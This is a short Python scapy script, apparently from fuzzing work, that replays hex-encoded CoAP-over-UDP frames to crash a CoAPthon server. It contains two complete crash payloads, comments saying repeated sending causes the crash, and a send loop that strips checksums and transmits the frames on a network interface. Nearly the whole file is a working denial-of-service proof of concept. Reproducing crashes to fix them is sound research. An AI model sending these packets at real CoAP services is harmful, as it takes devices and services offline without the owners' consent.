import scapy.all as scapy
import time
from binascii import unhexlify

# Start from 88990
# duplicate this packte for 3 times (can get crash)
packet_lst_crash_CoAPthon_1 = [
                        "ecf1f8d5476becf1f8d5476b080045000052d415400040117ff60a2f00010a0dd25280a51633003e6ae65803fdc20f54e9d167a39343ae7365706172617465ff6868686868686868686868686868686868686868686868686868686868686868",
                           ]
# duplicate this packet for around 10 times can get crash
packet_lst_crash_CoAPthon_2 = [
                        "ecf1f8d5476becf1f8d5476b0800450003a7df2b40004011718b0a2f00010a0dd25280a51633039329bc4703fdcc0f54e9db386f0904c66368696c641100d12310ff68686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868",
                           ]

    # manage to solve the sending packets to server issue   
def verify_lst_server(lst):
    count = 2
    for idx, pkt in enumerate(lst):
        # time.sleep(3)
        print("Packet: ", idx)
        while(count > 1):
            frame = scapy.Ether(unhexlify(pkt))
            frame[scapy.Ether].src =''
            frame[scapy.Ether].dst = ''
            frame[scapy.IP].src = ''
            frame[scapy.IP].dst = ''

            del frame[scapy.IP].chksum
            del frame[scapy.UDP].chksum
            scapy.sendp(frame,iface = 'veth5')
            time.sleep(0.5)
            count = count - 1
            print(count)
            # time.sleep(1)
        count = 2


# test replicatble crashed packets to the board
count = 5
while(count>0):
    verify_lst_server(packet_lst_crash_CoAPthon_1)
    count = count -1
